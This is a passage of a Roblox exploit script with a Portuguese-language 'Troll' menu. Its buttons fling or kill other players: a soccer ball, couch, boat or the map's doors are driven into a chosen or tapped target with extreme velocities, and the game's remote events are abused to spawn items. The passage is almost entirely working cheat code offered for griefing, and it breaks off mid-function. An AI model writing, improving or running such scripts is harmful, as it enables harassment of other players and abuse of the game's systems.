			end
		end
	end
})


local function FlingBall(target)

    local players = game:GetService("Players")
    local player = players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local hrp = character:WaitForChild("HumanoidRootPart")
    local backpack = player:WaitForChild("Backpack")
    local ServerBalls = workspace.WorkspaceCom:WaitForChild("001_SoccerBalls")

    local function GetBall()
        if not backpack:FindFirstChild("SoccerBall") then
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "SoccerBall")
        end
        repeat task.wait() until backpack:FindFirstChild("SoccerBall")
        backpack.SoccerBall.Parent = character
        repeat task.wait() until ServerBalls:FindFirstChild("Soccer" .. player.Name)
        character.SoccerBall.Parent = backpack
        return ServerBalls:FindFirstChild("Soccer" .. player.Name)
    end

    local Ball = ServerBalls:FindFirstChild("Soccer" .. player.Name) or GetBall()
    Ball.CanCollide = false
    Ball.Massless = true
    Ball.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0, 0)

    if target ~= player then
        local tchar = target.Character
        if tchar and tchar:FindFirstChild("HumanoidRootPart") and tchar:FindFirstChild("Humanoid") then
            local troot = tchar.HumanoidRootPart
            local thum = tchar.Humanoid

            if Ball:FindFirstChildWhichIsA("BodyVelocity") then
                Ball:FindFirstChildWhichIsA("BodyVelocity"):Destroy()
            end

            local bv = Instance.new("BodyVelocity")
            bv.Name = "FlingPower"
            bv.Velocity = Vector3.new(9e8, 9e8, 9e8)
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.P = 9e900
            bv.Parent = Ball

            workspace.CurrentCamera.CameraSubject = thum
            local StartTime = os.time()
            repeat
                if troot.Velocity.Magnitude > 0 then
                -- Cálculo da posição ajustada com base na velocidade do alvo
                local pos_x = troot.Position.X + (troot.Velocity.X / 1.5)
                local pos_y = troot.Position.Y + (troot.Velocity.Y / 1.5)
                local pos_z = troot.Position.Z + (troot.Velocity.Z / 1.5)

                -- Posiciona a bola diretamente na posição ajustada
                local position = Vector3.new(pos_x, pos_y, pos_z)
                Ball.CFrame = CFrame.new(position)
                Ball.Orientation += Vector3.new(45, 60, 30)
else
for i, v in pairs(tchar:GetChildren()) do
if v:IsA("BasePart") and v.CanCollide and not v.Anchored then
Ball.CFrame = v.CFrame
task.wait(1/6000)
end
end
end
                task.wait(1/6000)
            until troot.Velocity.Magnitude > 1000 or thum.Health <= 0 or not tchar:IsDescendantOf(workspace) or target.Parent ~= players
            workspace.CurrentCamera.CameraSubject = humanoid
        end
    end
end

Troll:AddButton({
    Name = "FLING BOLA",
    Callback = function()
        FlingBall(game:GetService("Players")[selectedPlayerName])
    end
})

local Players = game:GetService('Players')
local lplayer = Players.LocalPlayer

local function isItemInInventory(itemName)
    for _, item in pairs(lplayer.Backpack:GetChildren()) do
        if item.Name == itemName then
            return true
        end
    end
    return false
end

local function equipItem(itemName)
    local item = lplayer.Backpack:FindFirstChild(itemName)
    if item then
        lplayer.Character.Humanoid:EquipTool(item)
    end
end

local function unequipItem(itemName)
    local item = lplayer.Character:FindFirstChild(itemName)
    if item then
        item.Parent = lplayer.Backpack
    end
end

local function ActiveAutoFling(targetPlayer)
    if not isItemInInventory("Couch") then
        local args = { [1] = "PickingTools", [2] = "Couch" }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
    end

    equipItem("Couch")
    getgenv().flingloop = true

    while getgenv().flingloop do
        local function flingloopfix()
            local Players = game:GetService("Players")
            local Player = Players.LocalPlayer
            local AllBool = false

            local SkidFling = function(TargetPlayer)
                local Character = Player.Character
                local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
                local RootPart = Humanoid and Humanoid.RootPart
                local TCharacter = TargetPlayer.Character
                local THumanoid, TRootPart, THead, Accessory, Handle

                if TCharacter:FindFirstChildOfClass("Humanoid") then
                    THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
                end
                if THumanoid and THumanoid.RootPart then
                    TRootPart = THumanoid.RootPart
                end
                if TCharacter:FindFirstChild("Head") then
                    THead = TCharacter.Head
                end
                if TCharacter:FindFirstChildOfClass("Accessory") then
                    Accessory = TCharacter:FindFirstChildOfClass("Accessory")
                end
                if Accessory and Accessory:FindFirstChild("Handle") then
                    Handle = Accessory.Handle
                end

                if Character and Humanoid and RootPart then
                    if RootPart.Velocity.Magnitude < 50 then
                        getgenv().OldPos = RootPart.CFrame
                    end
                    if THumanoid and THumanoid.Sit and not AllBool then
                        unequipItem("Couch")
                        getgenv().flingloop = false
                        return
                    end
                    if THead then
                        workspace.CurrentCamera.CameraSubject = THead
                    elseif not THead and Handle then
                        workspace.CurrentCamera.CameraSubject = Handle
                    elseif THumanoid and TRootPart then
                        workspace.CurrentCamera.CameraSubject = THumanoid
                    end

                    if not TCharacter:FindFirstChildWhichIsA("BasePart") then
                        return
                    end

                    local FPos = function(BasePart, Pos, Ang)
                        RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
                        Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
                        RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
                        RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
                    end

                    local SFBasePart = function(BasePart)
                        local TimeToWait = 2
                        local Time = tick()
                        local Angle = 0
                        repeat
                            if RootPart and THumanoid then
                                if BasePart.Velocity.Magnitude < 50 then
                                    Angle = Angle + 100
                                    FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))
                                    task.wait()
                                else
                                    FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(-90), 0, 0))
                                    task.wait()
                                    FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                                    task.wait()
                                end
                            else
                                break
                            end
                        until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait or getgenv().flingloop == false
                    end

                    workspace.FallenPartsDestroyHeight = 0/0
                    local BV = Instance.new("BodyVelocity")
                    BV.Name = "SpeedDoPai"
                    BV.Parent = RootPart
                    BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
                    BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
                    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

                    if TRootPart and THead then
                        if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
                            SFBasePart(THead)
                        else
                            SFBasePart(TRootPart)
                        end
                    elseif TRootPart and not THead then
                        SFBasePart(TRootPart)
                    elseif not TRootPart and THead then
                        SFBasePart(THead)
                    elseif not TRootPart and not THead and Accessory and Handle then
                        SFBasePart(Handle)
                    end
                    BV:Destroy()
                    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                    workspace.CurrentCamera.CameraSubject = Humanoid

                    repeat
                        RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
                        Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
                        Humanoid:ChangeState("GettingUp")
                        table.foreach(Character:GetChildren(), function(_, x)
                            if x:IsA("BasePart") then
                                x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
                            end
                        end)
                        task.wait()
                    until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25

                    workspace.FallenPartsDestroyHeight = getgenv().FPDH
                end
            end

            if AllBool then
                for _, x in next, Players:GetPlayers() do
                    SkidFling(x)
                end
            end

            if targetPlayer then
                SkidFling(targetPlayer)
            end

            task.wait()
        end

        wait()
        pcall(flingloopfix)
    end
end

local kill = Troll:AddSection({Name = "FLING BARCO"})

Troll:AddButton({
    Name = "FLING BARCO",
    Callback = function()
        if not selectedPlayerName or not game.Players:FindFirstChild(selectedPlayerName) then
            warn("Nenhum jogador selecionado ou não existe")
            return
        end

        local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character and Character:FindFirstChild("HumanoidRootPart")
        local Vehicles = game.Workspace:FindFirstChild("Vehicles")

        if not Humanoid or not RootPart then
            warn("Humanoid ou RootPart inválido")
            return
        end

        local function spawnBoat()
            RootPart.CFrame = CFrame.new(1754, -2, 58)
            task.wait(0.5)
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "MilitaryBoatFree")
            task.wait(1)
            return Vehicles:FindFirstChild(Player.Name.."Car")
        end

        local PCar = Vehicles:FindFirstChild(Player.Name.."Car") or spawnBoat()
        if not PCar then
            warn("Falha ao spawnar o barco")
            return
        end

        local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
        if not Seat then
            warn("Assento não encontrado")
            return
        end

        repeat 
            task.wait(0.1)
            RootPart.CFrame = Seat.CFrame * CFrame.new(0, 1, 0)
        until Humanoid.SeatPart == Seat

        print("Barco spawnado!")

        local TargetPlayer = game.Players:FindFirstChild(selectedPlayerName)
        if not TargetPlayer or not TargetPlayer.Character then
            warn("Jogador não encontrado")
            return
        end

        local TargetC = TargetPlayer.Character
        local TargetH = TargetC:FindFirstChildOfClass("Humanoid")
        local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")

        if not TargetRP or not TargetH then
            warn("Humanoid ou RootPart do alvo não encontrado")
            return
        end

        local Spin = Instance.new("BodyAngularVelocity")
        Spin.Name = "Spinning"
        Spin.Parent = PCar.PrimaryPart
        Spin.MaxTorque = Vector3.new(0, math.huge, 0)
        Spin.AngularVelocity = Vector3.new(0, 369, 0) 

        print("Fling ativo!")

        local function moveCar(TargetRP, offset)
            if PCar and PCar.PrimaryPart then
                PCar:SetPrimaryPartCFrame(CFrame.new(TargetRP.Position + offset))
            end
        end

        task.spawn(function()
            while PCar and PCar.Parent and TargetRP and TargetRP.Parent do
                task.wait(0.01) 
                
                moveCar(TargetRP, Vector3.new(0, 1, 0))  
                moveCar(TargetRP, Vector3.new(0, -2.25, 5))  
                moveCar(TargetRP, Vector3.new(0, 2.25, 0.25))  
                moveCar(TargetRP, Vector3.new(-2.25, -1.5, 2.25))  
                moveCar(TargetRP, Vector3.new(0, 1.5, 0))  
                moveCar(TargetRP, Vector3.new(0, -1.5, 0))  

                if PCar and PCar.PrimaryPart then
                    local Rotation = CFrame.Angles(
                        math.rad(math.random(-369, 369)),  
                        math.rad(math.random(-369, 369)), 
                        math.rad(math.random(-369, 369))
                    )
                    PCar:SetPrimaryPartCFrame(CFrame.new(TargetRP.Position + Vector3.new(0, 1.5, 0)) * Rotation)
                end
            end

            if Spin and Spin.Parent then
                Spin:Destroy()
                print("Fling desativado")
            end
        end)
    end
})
print("Fling - Boat button created")

Troll:AddButton({
    Name = "DESATIVAR FLING BARCO",
    Callback = function()
        local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local RootPart = Character and Character:FindFirstChild("HumanoidRootPart")
        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
        local Vehicles = game.Workspace:FindFirstChild("Vehicles")

        if not RootPart or not Humanoid then
            warn("Nenhum RootPart ou Humanoid encontrado!")
            return
        end

        Humanoid.PlatformStand = true
        print("Jogador paralisado para reduzir efeitos do spin.")

        for _, obj in pairs(RootPart:GetChildren()) do
            if obj:IsA("BodyAngularVelocity") or obj:IsA("BodyVelocity") then
                obj:Destroy()
            end
        end
        print("Spin e forças removidas do jogador.")

        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("DeleteAllVehicles")
        task.wait(0.5)

        local PCar = Vehicles and Vehicles:FindFirstChild(Player.Name.."Car")
        if PCar and PCar.PrimaryPart then
            for _, obj in pairs(PCar.PrimaryPart:GetChildren()) do
                if obj:IsA("BodyAngularVelocity") or obj:IsA("BodyVelocity") then
                    obj:Destroy()
                end
            end
            print("Spin removido do barco.")
        end

        task.wait(1)

        local safePos = Vector3.new(0, 1000, 0)
        local bp = Instance.new("BodyPosition", RootPart)
        bp.Position = safePos
        bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

        local bg = Instance.new("BodyGyro", RootPart)
        bg.CFrame = RootPart.CFrame
        bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)

        print("Jogador está preso na coordenada segura.")

        task.wait(3)

        bp:Destroy()
        bg:Destroy()
        Humanoid.PlatformStand = false

        print("Jogador liberado, seguro na posição.")
    end
})

local kill = Troll:AddSection({Name = "FLING CLICKS"})

Troll:AddButton({
  Name = "FLING PORTA CLICK",
Description = "FIQUE PERTO DAS PORTAS",
  Callback = function()
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local HRP = Character:WaitForChild("HumanoidRootPart")

-- Alvo invisível (BlackHole)
local BlackHole = Instance.new("Part")
BlackHole.Size = Vector3.new(100000, 100000, 100000)
BlackHole.Transparency = 1
BlackHole.Anchored = true
BlackHole.CanCollide = false
BlackHole.Name = "BlackHoleTarget"
BlackHole.Parent = Workspace

-- Attachment base no BlackHole
local baseAttachment = Instance.new("Attachment")
baseAttachment.Name = "Luscaa_BlackHoleAttachment"
baseAttachment.Parent = BlackHole

-- Atualiza posição do BlackHole
RunService.Heartbeat:Connect(function()
	BlackHole.CFrame = HRP.CFrame
end)

-- Lista de portas controladas
local ControlledDoors = {}

-- Prepara uma porta para ser controlada
local function SetupPart(part)
	if not part:IsA("BasePart") or part.Anchored or not string.find(part.Name, "Door") then return end
	if part:FindFirstChild("Luscaa_Attached") then return end

	part.CanCollide = false

	for _, obj in ipairs(part:GetChildren()) do
		if obj:IsA("AlignPosition") or obj:IsA("Torque") or obj:IsA("Attachment") then
			obj:Destroy()
		end
	end

	local marker = Instance.new("BoolValue", part)
	marker.Name = "Luscaa_Attached"

	local a1 = Instance.new("Attachment", part)

	local align = Instance.new("AlignPosition", part)
	align.Attachment0 = a1
	align.Attachment1 = baseAttachment
	align.MaxForce = 1e20
	align.MaxVelocity = math.huge
	align.Responsiveness = 99999

	local torque = Instance.new("Torque", part)
	torque.Attachment0 = a1
	torque.RelativeTo = Enum.ActuatorRelativeTo.World
	torque.Torque = Vector3.new(
		math.random(-10e5, 10e5) * 10000,
		math.random(-10e5, 10e5) * 10000,
		math.random(-10e5, 10e5) * 10000
	)

	table.insert(ControlledDoors, {Part = part, Align = align})
end

-- Detecta e prepara portas existentes
for _, obj in ipairs(Workspace:GetDescendants()) do
	if obj:IsA("BasePart") and string.find(obj.Name, "Door") then
		SetupPart(obj)
	end
end

-- Novas portas no futuro
Workspace.DescendantAdded:Connect(function(obj)
	if obj:IsA("BasePart") and string.find(obj.Name, "Door") then
		SetupPart(obj)
	end
end)

-- Flinga jogador com timeout e retorno
local function FlingPlayer(player)
	local char = player.Character
	if not char then return end
	local targetHRP = char:FindFirstChild("HumanoidRootPart")
	if not targetHRP then return end

	local targetAttachment = targetHRP:FindFirstChild("SHNMAX_TargetAttachment")
	if not targetAttachment then
		targetAttachment = Instance.new("Attachment", targetHRP)
		targetAttachment.Name = "SHNMAX_TargetAttachment"
	end

	for _, data in ipairs(ControlledDoors) do
		if data.Align then
			data.Align.Attachment1 = targetAttachment
		end
	end

	local start = tick()
	local flingDetected = false

	while tick() - start < 5 do
		if targetHRP.Velocity.Magnitude >= 20 then
			flingDetected = true
			break
		end
		RunService.Heartbeat:Wait()
	end

	-- Sempre retorna as portas
	for _, data in ipairs(ControlledDoors) do
		if data.Align then
			data.Align.Attachment1 = baseAttachment
		end
	end
end

-- Clique (funciona no mobile)
UserInputService.TouchTap:Connect(function(touchPositions, processed)
	if processed then return end
	local pos = touchPositions[1]
	local camera = Workspace.CurrentCamera
	local unitRay = camera:ScreenPointToRay(pos.X, pos.Y)
	local raycast = Workspace:Raycast(unitRay.Origin, unitRay.Direction * 1000)

	if raycast and raycast.Instance then
		local hit = raycast.Instance
		local player = Players:GetPlayerFromCharacter(hit:FindFirstAncestorOfClass("Model"))
		if player and player ~= LocalPlayer then
			FlingPlayer(player)
		end
	end
end)
  end
})


Troll:AddButton({
    Name = "FLING SOFA CLICK ",
    Callback = function()

local jogadores = game:GetService("Players")
local rep = game:GetService("ReplicatedStorage")
local entrada = game:GetService("UserInputService")
local eu = jogadores.LocalPlayer
local cam = workspace.CurrentCamera

local podeClicar = true
local ferramentaEquipada = false
local NOME_FERRAMENTA = "Click Fling Couch"

local mochila = eu:WaitForChild("Backpack")

if not mochila:FindFirstChild(NOME_FERRAMENTA) and not (eu.Character and eu.Character:FindFirstChild(NOME_FERRAMENTA)) then
	local ferramenta = Instance.new("Tool")
	ferramenta.Name = NOME_FERRAMENTA
	ferramenta.RequiresHandle = false
	ferramenta.CanBeDropped = false

	ferramenta.Equipped:Connect(function()
		ferramentaEquipada = true
	end)

	ferramenta.Unequipped:Connect(function()
		ferramentaEquipada = false
	end)

	ferramenta.Parent = mochila
end

local function jogarComSofa(alvo)
	if not ferramentaEquipada then return end
	if not alvo or not alvo.Character or alvo == eu then return end

	local jogando = true
	local raiz = eu.Character and eu.Character:FindFirstChild("HumanoidRootPart")
	local alvoRaiz = alvo.Character and alvo.Character:FindFirstChild("HumanoidRootPart")
	if not raiz or not alvoRaiz then return end

	local boneco = eu.Character
	local humano = boneco:FindFirstChildOfClass("Humanoid")
	local posOriginal = raiz.CFrame

	rep:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
	task.wait(0.2)

	rep.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
	task.wait(0.3)

	local sofa = eu.Backpack:FindFirstChild("Couch")
	if sofa then
		sofa.Parent = boneco
	end
	task.wait(0.1)

	game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.F, false, game)
	task.wait(0.25)

	workspace.FallenPartsDestroyHeight = 0/0

	local forca = Instance.new("BodyVelocity")
	forca.Name = "ForcaJogada"
	forca.Velocity = Vector3.new(9e8, 9e8, 9e8)
	forca.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
	forca.Parent = raiz

	humano:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
	humano.PlatformStand = false
	cam.CameraSubject = alvo.Character:FindFirstChild("Head") or alvoRaiz or humano

	task.spawn(function()
		local angulo = 0
		local partes = {raiz}
		while jogando and alvo and alvo.Character and alvo.Character:FindFirstChildOfClass("Humanoid") do
			local alvoHum = alvo.Character:FindFirstChildOfClass("Humanoid")
			if alvoHum.Sit then break end
			angulo += 50

			for _, parte in ipairs(partes) do
				local hrp = alvo.Character.HumanoidRootPart
				local pos = hrp.Position + hrp.Velocity / 1.5
				raiz.CFrame = CFrame.new(pos) * CFrame.Angles(math.rad(angulo), 0, 0)
			end

			raiz.Velocity = Vector3.new(9e8, 9e8, 9e8)
			raiz.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
			task.wait()
		end

		jogando = false
		forca:Destroy()
		humano:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
		humano.PlatformStand = false
		raiz.CFrame = posOriginal
		cam.CameraSubject = humano

		for _, p in pairs(boneco:GetDescendants()) do
			if p:IsA("BasePart") then
				p.Velocity = Vector3.zero
				p.RotVelocity = Vector3.zero
			end
		end

		humano:UnequipTools()
		rep.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
	end)

	while jogando do
		task.wait()
	end
end

entrada.TouchTap:Connect(function(toques, processado)
	if processado or not podeClicar or not ferramentaEquipada then return end

	local pos = toques[1]
	local raio = cam:ScreenPointToRay(pos.X, pos.Y)
	local acerto = workspace:Raycast(raio.Origin, raio.Direction * 1000)

	if acerto and acerto.Instance then
		local alvo = jogadores:GetPlayerFromCharacter(acerto.Instance:FindFirstAncestorOfClass("Model"))
		if alvo and alvo ~= eu then
			podeClicar = false
			jogarComSofa(alvo)
			task.delay(2, function()
				podeClicar = true
			end)
		end
	end
end)
end
})

Troll:AddButton({
    Name = "FLING BOLA CLICK",
    Callback = function()
local jogadores = game:GetService("Players")
local rep = game:GetService("ReplicatedStorage")
local mundo = game:GetService("Workspace")
local entrada = game:GetService("UserInputService")
local cam = mundo.CurrentCamera
local eu = jogadores.LocalPlayer

local NOME_FERRAMENTA = "Click Fling Ball"
local ferramentaEquipada = false

local mochila = eu:WaitForChild("Backpack")
if not mochila:FindFirstChild(NOME_FERRAMENTA) then
	local ferramenta = Instance.new("Tool")
	ferramenta.Name = NOME_FERRAMENTA
	ferramenta.RequiresHandle = false
	ferramenta.CanBeDropped = false

	ferramenta.Equipped:Connect(function()
		ferramentaEquipada = true
	end)

	ferramenta.Unequipped:Connect(function()
		ferramentaEquipada = false
	end)

	ferramenta.Parent = mochila
end

-- Função FlingBall (bola)
local function FlingBall(target)
    

    local players = game:GetService("Players")
    local player = players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local hrp = character:WaitForChild("HumanoidRootPart")
    local backpack = player:WaitForChild("Backpack")
    local ServerBalls = workspace.WorkspaceCom:WaitForChild("001_SoccerBalls")

    local function GetBall()
        if not backpack:FindFirstChild("SoccerBall") and not character:FindFirstChild("SoccerBall") then
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "SoccerBall")
        end

        repeat task.wait() until backpack:FindFirstChild("SoccerBall") or character:FindFirstChild("SoccerBall")

        local ballTool = backpack:FindFirstChild("SoccerBall")
        if ballTool then
            ballTool.Parent = character
        end

        repeat task.wait() until ServerBalls:FindFirstChild("Soccer" .. player.Name)

        return ServerBalls:FindFirstChild("Soccer" .. player.Name)
    end

    local Ball = ServerBalls:FindFirstChild("Soccer" .. player.Name) or GetBall()
    Ball.CanCollide = false
    Ball.Massless = true
    Ball.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0, 0)

    if target ~= player then
        local tchar = target.Character
        if tchar and tchar:FindFirstChild("HumanoidRootPart") and tchar:FindFirstChild("Humanoid") then
            local troot = tchar.HumanoidRootPart
            local thum = tchar.Humanoid

            if Ball:FindFirstChildWhichIsA("BodyVelocity") then
                Ball:FindFirstChildWhichIsA("BodyVelocity"):Destroy()
            end

            local bv = Instance.new("BodyVelocity")
            bv.Name = "FlingPower"
            bv.Velocity = Vector3.new(9e8, 9e8, 9e8)
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.P = 9e900
            bv.Parent = Ball

            workspace.CurrentCamera.CameraSubject = thum

            repeat
                if troot.Velocity.Magnitude > 0 then
                    local pos = troot.Position + (troot.Velocity / 1.5)
                    Ball.CFrame = CFrame.new(pos)
                    Ball.Orientation += Vector3.new(45, 60, 30)
                else
                    for i, v in pairs(tchar:GetChildren()) do
                        if v:IsA("BasePart") and v.CanCollide and not v.Anchored then
                            Ball.CFrame = v.CFrame
                            task.wait(1/6000)
                        end
                    end
                end
                task.wait(1/6000)
            until troot.Velocity.Magnitude > 1000 or thum.Health <= 0 or not tchar:IsDescendantOf(workspace) or target.Parent ~= players

            workspace.CurrentCamera.CameraSubject = humanoid
        end
    end
end

-- Toque na tela para aplicar a bola
entrada.TouchTap:Connect(function(toques, processado)
	if not ferramentaEquipada or processado then return end
	local pos = toques[1]
	local raio = cam:ScreenPointToRay(pos.X, pos.Y)
	local hit = mundo:Raycast(raio.Origin, raio.Direction * 1000)
	if hit and hit.Instance then
		local modelo = hit.Instance:FindFirstAncestorOfClass("Model")
		local jogador = jogadores:GetPlayerFromCharacter(modelo)
		if jogador and jogador ~= eu then
			FlingBall(jogador)
		end
	end
end)

end
})

Troll:AddButton({
    Name = "FLING ELIMINAR SOFA CLICK",
    Callback = function()

local jogadores = game:GetService("Players")
local rep = game:GetService("ReplicatedStorage")
local loop = game:GetService("RunService")
local mundo = game:GetService("Workspace")
local entrada = game:GetService("UserInputService")

local eu = jogadores.LocalPlayer
local cam = mundo.CurrentCamera

local NOME_FERRAMENTA = "Click Kill Couch"
local ferramentaEquipada = false
local nomeAlvo = nil
local loopTP = nil
local sofaEquipado = false
local base = nil
local posInicial = nil
local raiz = nil

local mochila = eu:WaitForChild("Backpack")
if not mochila:FindFirstChild(NOME_FERRAMENTA) then
	local ferramenta = Instance.new("Tool")
	ferramenta.Name = NOME_FERRAMENTA
	ferramenta.RequiresHandle = false
	ferramenta.CanBeDropped = false

	ferramenta.Equipped:Connect(function()
		ferramentaEquipada = true
	end)

	ferramenta.Unequipped:Connect(function()
		ferramentaEquipada = false
		nomeAlvo = nil
		limparSofa()
	end)

	ferramenta.Parent = mochila
end

function limparSofa()
	if loopTP then
		loopTP:Disconnect()
		loopTP = nil
	end

	if sofaEquipado then
		local boneco = eu.Character
		if boneco then
			local sofa = boneco:FindFirstChild("Couch")
			if sofa then
				sofa.Parent = eu.Backpack
				sofaEquipado = false
			end
		end
	end

	if base then
		base:Destroy()
		base = nil
	end

	if getgenv().AntiSit then
		getgenv().AntiSit:Set(false)
	end

	local humano = eu.Character and eu.Character:FindFirstChildOfClass("Humanoid")
	if humano then
		humano:SetStateEnabled(Enum.HumanoidStateType.Physics, true)
		humano:ChangeState(Enum.HumanoidStateType.GettingUp)
	end

	if posInicial and raiz then
		raiz.CFrame = posInicial
		posInicial = nil
	end
end

function pegarSofa()
	local boneco = eu.Character
	if not boneco then return end
	local mochila = eu.Backpack

	if not mochila:FindFirstChild("Couch") and not boneco:FindFirstChild("Couch") then
		local args = { "PickingTools", "Couch" }
		rep.RE["1Too1l"]:InvokeServer(unpack(args))
		task.wait(0.1)
	end

	local sofa = mochila:FindFirstChild("Couch") or boneco:FindFirstChild("Couch")
	if sofa then
		sofa.Parent = boneco
		sofaEquipado = true
	end
end

function posAleatoriaAbaixo(boneco)
	local rp = boneco:FindFirstChild("HumanoidRootPart")
	if not rp then return Vector3.new() end
	local offset = Vector3.new(math.random(-2, 2), -5.1, math.random(-2, 2))
	return rp.Position + offset
end

function tpAbaixo(alvo)
	if not alvo or not alvo.Character or not alvo.Character:FindFirstChild("HumanoidRootPart") then return end

	local meuBoneco = eu.Character
	local minhaRaiz = meuBoneco and meuBoneco:FindFirstChild("HumanoidRootPart")
	local humano = meuBoneco and meuBoneco:FindFirstChildOfClass("Humanoid")

	if not minhaRaiz or not humano then return end

	humano:SetStateEnabled(Enum.HumanoidStateType.Physics, false)

	if not base then
		base = Instance.new("Part")
		base.Size = Vector3.new(10, 1, 10)
		base.Anchored = true
		base.CanCollide = true
		base.Transparency = 0.5
		base.Parent = mundo
	end

	local destino = posAleatoriaAbaixo(alvo.Character)
	base.Position = destino
	minhaRaiz.CFrame = CFrame.new(destino)

	humano:SetStateEnabled(Enum.HumanoidStateType.Physics, true)
end

function arremessarComSofa(alvo)
	if not alvo then return end
	nomeAlvo = alvo.Name
	local boneco = eu.Character
	if not boneco then return end

	posInicial = boneco:FindFirstChild("HumanoidRootPart") and boneco.HumanoidRootPart.CFrame
	raiz = boneco:FindFirstChild("HumanoidRootPart")
	pegarSofa()

	loopTP = loop.Heartbeat:Connect(function()
		local alvoAtual = jogadores:FindFirstChild(nomeAlvo)
		if not alvoAtual or not alvoAtual.Character or not alvoAtual.Character:FindFirstChild("Humanoid") then
			limparSofa()
			return
		end
		if getgenv().AntiSit then
			getgenv().AntiSit:Set(true)
		end
		tpAbaixo(alvoAtual)
	end)

	task.spawn(function()
		local alvoAtual = jogadores:FindFirstChild(nomeAlvo)
